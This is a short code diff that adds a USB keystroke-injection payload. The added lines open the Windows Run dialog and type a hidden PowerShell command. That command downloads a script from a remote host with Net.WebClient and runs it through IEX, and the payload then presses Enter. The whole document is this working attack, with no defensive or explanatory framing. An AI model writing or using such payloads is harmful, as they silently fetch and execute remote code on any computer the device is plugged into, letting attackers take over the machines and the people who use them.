@@ -1,0 +1,4 @@
+# Windows Key + R
+payload1 = [usb.RUN]
+payload2 = usb.get_sequence('powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).downloadString(\'http://example.org/powershell-to-host.txt\')"')
+payload2 += [usb.ENTER]
